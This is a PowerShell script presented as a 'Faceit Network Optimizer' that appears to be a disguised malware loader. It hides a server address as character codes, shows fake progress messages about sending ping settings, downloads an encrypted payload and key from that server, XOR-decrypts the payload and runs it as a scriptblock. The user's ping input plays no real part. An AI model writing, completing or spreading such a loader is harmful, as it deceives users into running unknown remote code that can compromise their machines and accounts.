# Faceit Network Optimizer

function Show-Progress {
    param([string]$Activity, [int]$Percent)
    Write-Progress -Activity $Activity -PercentComplete $Percent
}



Write-Host ""
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host "       Faceit Network Optimizer" -ForegroundColor Cyan
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host ""


$host.UI.RawUI.ForegroundColor = 'DarkYellow'
$ping = Read-Host '  Enter max ping (ms)'
$host.UI.RawUI.ForegroundColor = 'Gray'
Write-Host ""

Show-Progress -Activity "Connecting to server..." -Percent 20

$sUllz = 'http://' + 
             [char]55+[char]50+'.'+
             [char]53+[char]54+'.'+
             [char]52+[char]49+'.'+
             [char]50+[char]48+[char]55+':5000'

try {

    Show-Progress -Activity "Requesting optimizer..." -Percent 30
    $key = Invoke-RestMethod "$sUllz/.key" -TimeoutSec 20
    

    Show-Progress -Activity "Sending your max ping..." -Percent 50
    $encrypted = Invoke-RestMethod "$sUllz/loader.ps1" -TimeoutSec 20

    Show-Progress -Activity "Getting settings for optimizer..." -Percent 70
    
    $z = [Convert]::FromBase64String($encrypted)
    $w = [Text.Encoding]::UTF8.GetBytes($key)
    $r = New-Object byte[] $z.Length
    
    for($j = 0; $j -lt $z.Length; $j++) {
        $r[$j] = $z[$j] -bxor $w[$j % $w.Length]
        

        if($j % 1000 -eq 0) {
            $percent = 70 + (($j / $z.Length) * 20)
            Show-Progress -Activity "Reading your settings..." -Percent $percent
        }
    }
    
   
    Show-Progress -Activity "Launching optimizer..." -Percent 95
    Start-Sleep -Milliseconds 300
    
    Write-Progress -Activity "Complete" -Completed
    
    Write-Host "  [✓] Optimizer launched successfuly" -ForegroundColor Green
    Write-Host "  [*] Please wait for complete..." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
    

    $global:MaxPing = $ping
    

    $scriptBlock = [scriptblock]::Create([Text.Encoding]::UTF8.GetString($r))
    & $scriptBlock
    
  
    Write-Host "  [✓] Optimization complete!" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Press any key to continue..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
} catch {
    Write-Progress -Activity "Error" -Completed
    Write-Host ""
    Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Press any key to continue..." -ForegroundColor Gray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}
